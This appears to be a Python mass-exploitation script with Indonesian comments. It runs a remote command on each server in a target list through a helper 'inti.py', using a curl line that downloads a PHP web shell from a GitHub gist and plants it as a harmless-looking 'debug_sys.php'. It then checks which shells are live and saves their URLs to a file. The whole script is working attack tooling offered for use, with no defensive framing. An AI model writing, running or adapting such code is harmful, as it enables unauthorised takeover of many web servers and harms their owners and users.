import subprocess
import argparse
import os
import requests
import warnings
from rich.console import Console
from rich.progress import track
from concurrent.futures import ThreadPoolExecutor

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
warnings.filterwarnings("ignore")

console = Console()
#kalian bisa pake shell kalian sendiri tinggal up disini aja url ya:)
GIST_URL = "https://gist.githubusercontent.com/anon1137/4ef8ccf2936dc716c01ea7a364db566b/raw/e16c8be86274a2a58480c7d177e423a18c2b532d/bypass.txt"
SHELL_NAME = "debug_sys.php" #nama shell kalian

def single_exploit(target, output_file):
    try:
        target = target.rstrip('/')
        exploit_cmd = f"curl -sL {GIST_URL} -o {SHELL_NAME}"
        
        subprocess.run(
            ["python3", "inti.py", "-u", target, "-f", "system", "-p", exploit_cmd],
            capture_output=True, text=True, timeout=45
        )

        shell_url = f"{target}/{SHELL_NAME}"
        try:
            cek = requests.get(shell_url, timeout=10, verify=False)
            if cek.status_code == 200:
                console.print(f"[bold green][ LIVE SHELL ][/bold green] {shell_url}")
                with open(output_file, "a") as f_out:
                    f_out.write(f"{shell_url}\n")
                return True
        except:
            pass

    except Exception:
        pass
    return False

def run_exploit(target_list, output_file):
    if not os.path.exists(target_list):
        console.print(f"[red][!] File {target_list} tidak ditemukan.[/red]")
        return
    
    with open(target_list, "r") as f:
        targets = [line.strip() for line in f if line.strip()]

    console.print(f"[bold blue][*][/bold blue] Total: {len(targets)} | Multi-threaded Exploit Aktif...")
    
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(single_exploit, t, output_file) for t in targets]
        for _ in track(futures, description="Exploiting..."):
            _.result()

    console.print(f"\n[bold green]Selesai![/bold green] Cek: [bold white]{output_file}[/bold white]")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--list", required=True)
    parser.add_argument("-o", "--output", default="shells_valid.txt")
    args = parser.parse_args()
    
    run_exploit(args.list, args.output)
